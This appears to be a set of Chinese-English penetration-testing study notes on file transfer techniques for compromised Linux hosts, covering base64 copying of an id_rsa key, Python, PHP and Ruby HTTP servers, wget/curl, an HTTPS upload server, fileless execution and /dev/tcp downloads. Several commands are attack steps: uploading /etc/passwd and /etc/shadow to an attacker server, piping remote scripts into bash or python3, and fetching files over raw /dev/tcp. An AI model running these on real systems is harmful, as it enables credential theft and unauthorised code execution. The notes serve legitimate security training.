- Check File integrity: `md5sum id_rsa`
# Base64 Encode/Decode Transfer
将文件base64编码后，在复制回来解码
```bash
cat id_rsa |base64 -w 0;echo
echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZ...' | base64 -d > id_rsa
```

# HTTP Transfer
## Set Up a HTTP Server
也可以通过在远程主机启动http server来下载文件。**--- fireWall : Inbound traffic may be blocked**
```bash
python3 -m http.server
python2.7 -m SimpleHTTPServer
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000

wget 192.168.49.128:8000/filetotransfer.txt
```
## Curl && Wget
如果目标主机有这两功能，也是比较常用的命令，**它们还可以实现无文件执行payload!**
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
Upload：
#confusion 用自签名的https跟http有什么区别？
```bash
#启动HTTPS服务器； 将生成的自签名放到其他目录（不能在上传用的根目录下）下。通过命令行引用
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
### Fileless Attaks
就是将下载的文件的标准输出发送到执行程序中，进入内存执行
```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
## Use Bash to Download
>当没有Wget/Curl可以用的时候。直接使用bash的/dev/TCP传输(bash >= 2.04, 使用--enable-net-redirections 编译)
>响应还是比较慢的。要自己写标头
```bash
exec 3<>/dev/tcp/10.10.10.32/80 #自定义的I/O文件描述符
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3 >{$file}
```
# SCP
>语法与cp类似，最好创建一个专用发送账号
```bash
sudo systemctl enable ssh #scp只能发送到ssh服务器中，启动ssh服务器
sudo systemctl start ssh
scp plaintext@192.168.49.128:/root/myroot.txt . 
```